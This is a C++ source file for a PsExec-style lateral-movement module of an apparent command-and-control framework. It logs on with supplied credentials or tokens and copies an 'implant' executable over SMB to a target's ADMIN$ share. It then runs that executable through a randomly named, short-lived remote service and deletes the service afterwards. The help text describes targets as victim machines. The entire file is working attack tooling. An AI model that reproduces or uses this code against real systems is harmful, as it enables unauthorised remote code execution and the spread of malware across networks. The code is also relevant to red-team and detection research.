#include "PsExec.hpp"

#include <cstring>
#include  <algorithm>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <winbase.h>
#endif

#include "Common.hpp"


using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

constexpr std::string_view moduleName = "psExec";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) PsExec* PsExecConstructor() 
{
    return new PsExec();
}

#else

__attribute__((visibility("default"))) PsExec* PsExecConstructor() 
{
    return new PsExec();
}

#endif


PsExec::PsExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
    srand(time(NULL));
}


PsExec::~PsExec()
{
}


std::string PsExec::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "PsExec Module:\n";
    info += "Execute a binary on a remote victim machine by creating a service using SCM and an exe file deliver via an SMB \\ADMIN$ share.\n";
    info += "- The target account must have sufficient privileges (Administrator) to create and start services on the remote host.\n";
    info += "- The service creation attempts to launch the provided executable directly as a Windows service.\n";
    info += "  * If the executable is NOT a valid service (does not implement ServiceMain/handle control codes), StartService will fail and the attempt will crash/return an error.\n";
    info += "  * You can wrap arbitrary binaries with a service wrapper (e.g. nssm) if you need to run non-service executables as services.\n";
    info += "- The module uses a short-lived service: the service is expected to stop within ~2 seconds and will be deleted after stopping.\n";
    info += "  * Therefore the executable launched by the service MUST NOT perform long-running tasks inside the service process (it should perform a quick action and exit).\n";
    info += "- Authentication: provide explicit credentials (-u/-p) or use Kerberos (-k) / current token (-n) as appropriate.\n";
    info += "\nExamples:\n";
    info += "- psExec -u DOMAIN\\\\Username Password m3dc.cyber.local /tmp/implant.exe\n";
    info += "- psExec -k m3dc.cyber.local /tmp/implant.exe\n";
    info += "- psExec -n m3dc.cyber.local /tmp/implant.exe\n";
    info += "- psExec -n 10.9.20.10 /tmp/implant.exe\n";
#endif
    return info;
}


int PsExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)

    if (splitedCmd.size() >= 2)
    {
        string mode = splitedCmd[1];

        if(mode=="-u" && splitedCmd.size() >= 6)
        {
            string usernameDomain=splitedCmd[2];
            string password=splitedCmd[3];
            string target=splitedCmd[4];
            std::string username="";
            std::string domain=".";

            std::vector<std::string> splitedList;
            splitList(usernameDomain, "\\", splitedList);

            if(splitedList.size()==1)
                username = splitedList[0];
            else if(splitedList.size()>1)
            {
                domain = splitedList[0];
                username = splitedList[1];
            }

            std::string cmd = domain;
            cmd += '\0';
            cmd += username;
            cmd += '\0';
            cmd += password;
            cmd += '\0';
            cmd += target;

            c2Message.set_cmd(cmd);

            string inputFile = splitedCmd[5];

            std::ifstream input(inputFile, std::ios::binary);
            if( input ) 
            {
                std::string buffer(std::istreambuf_iterator<char>(input), {});
                c2Message.set_data(buffer.data(), buffer.size());
            }
            else
            {
                c2Message.set_returnvalue("Failed: Couldn't open file.");
                return -1;
            }
        }
        else if((mode=="-n" || mode=="-k") && splitedCmd.size() >= 4)
        {
            string target = splitedCmd[2];

            std::string cmd = "";
            cmd += target;

            c2Message.set_cmd(cmd);

            string inputFile = splitedCmd[3];

            std::ifstream input(inputFile, std::ios::binary);
            if( input ) 
            {
                std::string buffer(std::istreambuf_iterator<char>(input), {});
                c2Message.set_data(buffer.data(), buffer.size());
            }
            else
            {
                c2Message.set_returnvalue("Failed: Couldn't open file.");
                return -1;
            }
        }
        else
        {
            c2Message.set_returnvalue(getInfo());
            return -1;
        }

        c2Message.set_instruction(splitedCmd[0]);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }



#endif
    return 0;
}


#define ERROR_COPY 1 
#define ERROR_CREATE_SERVICE 2
#define ERROR_DELETE 3
#define ERROR_AUTH_FAILED 4
#define ERROR_CONFIG 5
#define ERROR_OPEN_SCM 6
#define ERROR_OPEN_SERVICE 7
#define ERROR_START_SERVICE 8
#define ERROR_DEL_SERVICE 9
#define ERROR_STOP_SERVICE 10


#ifdef _WIN32

namespace
{

    std::wstring widen(const std::string& value)
    {
        if (value.empty())
        {
            return std::wstring();
        }

        int required = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
        if (required <= 0)
        {
            return std::wstring();
        }

        std::wstring buffer(static_cast<size_t>(required), L'\0');
        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required);
        return buffer;
    }


    std::string randomName( size_t length )
    {
        auto randchar = []() -> char
        {
            const char charset[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
            const size_t max_index = (sizeof(charset) - 1);
            return charset[ rand() % max_index ];
        };
        std::string str(length,0);
        std::generate_n( str.begin(), length, randchar );
        return str;
    }


    BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result)
    {
        HANDLE hFile = CreateFile(dstPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) 
        { 
            result = std::to_string(GetLastError());
            return FALSE;
        }

        DWORD dwBytesWritten = 0;
        BOOL success = WriteFile(hFile, data.data(), data.size(), &dwBytesWritten, NULL);
        if (!success)
            result = std::to_string(GetLastError());

        CloseHandle(hFile);

        return success;
    }


    int createServiceWithSCM(const std::string& scmServer, const std::string&  serviceName, const std::string& servicePath, std::string& result)
    {
        SERVICE_STATUS ss;
        // GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG
        SC_HANDLE hSCM = OpenSCManagerA(scmServer.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCM == NULL) 
        {
            result += std::to_string(GetLastError());
            return ERROR_OPEN_SCM;
        }
         
        SC_HANDLE hService = CreateServiceA(hSCM, 
                                            serviceName.c_str(), 
                                            serviceName.c_str(), 
                                            GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, 
                                            SERVICE_DEMAND_START, 
                                            SERVICE_ERROR_IGNORE, 
                                            servicePath.c_str(), 
                                            NULL, NULL, NULL, NULL, NULL);
        if (hService == NULL) 
        {
            result += std::to_string(GetLastError());
            return ERROR_CREATE_SERVICE;
        }

        hService = OpenServiceA(hSCM,serviceName.c_str(), GENERIC_ALL);
        if (hService == NULL)
        {
            result += std::to_string(GetLastError());
            DeleteService(hService);
            return ERROR_OPEN_SERVICE;
        }
        
        // fail if the exe is not a svc but a regular exe, but should launch it anyway
        BOOL sucess = StartService(hService, NULL, NULL);
        if(!sucess)
        {
            result += std::to_string(GetLastError());
            SERVICE_STATUS status;
            sucess = ControlService(hService, SERVICE_CONTROL_STOP, &status);
            DeleteService(hService);
            return ERROR_START_SERVICE;
        }

        Sleep(2000); // for the service to run

        SERVICE_STATUS status;
        sucess = ControlService(hService, SERVICE_CONTROL_STOP, &status);
        if(!sucess)
        {
            result += std::to_string(GetLastError());
            DeleteService(hService);
            return ERROR_STOP_SERVICE;
        }

        sucess = DeleteService(hService);
        if(!sucess)
        {
            result += std::to_string(GetLastError());
            return ERROR_DEL_SERVICE;
        }

        return 0;
    }

}

#endif


int PsExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string cmd = c2Message.cmd();
    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_cmd(cmd);

    std::string result;
    bool error = 0;

    #ifdef _WIN32

    std::vector<std::string> splitedList;
    std::string delimitator;
    delimitator+='\0';
    splitList(cmd, delimitator, splitedList);
    
    bool useToken=false;
    bool usePassword=false;
    std::string scmServer="";
    std::string domainName="";
    std::string username="";
    std::string user="";
    std::string password="";

    if(splitedList.size()==4)
    {
        usePassword=true;

        domainName=splitedList[0];
        username=splitedList[1];
        password=splitedList[2];
        scmServer=splitedList[3];

        user=domainName;
        user+="\\";
        user+=username;
    }
    else if(splitedList.size()==1)
    {
        usePassword=false;

        scmServer=splitedList[0];
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_CONFIG);
        c2RetMessage.set_returnvalue(result);
        return 0;
    }

    const std::string data = c2Message.data();

    std::string execName = randomName(8);

    std::string dstPath="\\\\";
    dstPath+=scmServer;
    dstPath+="\\admin$\\";
    dstPath+=execName;
    dstPath+=".exe";
    std::string serviceName=execName;
    std::string servicePath="%SystemRoot%\\";
    servicePath+=execName;
    servicePath+=".exe";

    HANDLE hToken;

    if(usePassword)
    {
        std::wstring usernameWide;
        std::wstring passwordWide;
        std::wstring domainNameWide;

        usernameWide = widen(username);
        passwordWide = widen(password);
        domainNameWide = widen(domainName);
        
        BOOL success = LogonUserW(usernameWide.c_str(), domainNameWide.c_str(), passwordWide.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);
        if(!success)
        {
            result = std::to_string(GetLastError());
            c2RetMessage.set_errorCode(ERROR_AUTH_FAILED);
            c2RetMessage.set_returnvalue(result);
            return 0;
        }

        success = ImpersonateLoggedOnUser(hToken);
        if(!success)
        {
            result = std::to_string(GetLastError());
            c2RetMessage.set_errorCode(ERROR_AUTH_FAILED);
            c2RetMessage.set_returnvalue(result);
            return 0;
        }
    }

    BOOL success = createFileSMB(dstPath, data, result);
    if (success) 
    {
        int ret = createServiceWithSCM(scmServer, serviceName, servicePath, result);
        if (ret!=0) 
        {
            DeleteFile(dstPath.c_str());
            if(usePassword)
            {
                RevertToSelf();
                CloseHandle(hToken);
            }
            c2RetMessage.set_errorCode(ret);
            c2RetMessage.set_returnvalue(result);
            return 0;
        }

        success = DeleteFile(dstPath.c_str());
        if (!success) 
        {
            error = ERROR_DELETE;
            result = std::to_string(GetLastError());
        }
    }
    else 
    {
        error = ERROR_COPY;
        result = std::to_string(GetLastError());
    }

    if(usePassword)
    {
        RevertToSelf();
        CloseHandle(hToken);
    }

    if(error)
        c2RetMessage.set_errorCode(error);
    else
    {
        result = "Sucess: SVC ";
        result += serviceName;
    }

    c2RetMessage.set_returnvalue(result);
    return 0;

#elif __linux__

    result = "Only supported on Windows.\n";
    return 0;

#endif

}


int PsExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    int errorCode = c2RetMessage.errorCode();
    if (errorCode > 0)
    {
        switch (errorCode)
        {
            case ERROR_COPY:
                errorMsg = "Failed to copy the file to the remote SMB share.";
                break;

            case ERROR_CREATE_SERVICE:
                errorMsg = "Failed to create the service (CreateService failed).";
                break;

            case ERROR_DELETE:
                errorMsg = "Failed to delete the remote file.";
                break;

            case ERROR_AUTH_FAILED:
                errorMsg = "Authentication failed: invalid credentials or insufficient privileges.";
                break;

            case ERROR_CONFIG:
                errorMsg = "Configuration error: invalid parameters, missing arguments or bad paths.";
                break;

            case ERROR_OPEN_SCM:
                errorMsg = "Failed to open the Service Control Manager on the target host.";
                break;

            case ERROR_OPEN_SERVICE:
                errorMsg = "Failed to open the service (service may not exist or access was denied).";
                break;

            case ERROR_START_SERVICE:
                errorMsg = "Failed to start the service. The specified executable is not a valid Windows service and did not exhibit the expected service behavior.";
                break;

            case ERROR_DEL_SERVICE:
                errorMsg = "Failed to delete the service (service may still be running or marked for deletion).";
                break;

            case ERROR_STOP_SERVICE:
                errorMsg = "Failed to stop the service (control request was denied or the service did not respond).";
                break;

            default:
                errorMsg = "Unknown error: code " + std::to_string(errorCode);
                break;
        }
    }
#endif
    return 0;
}

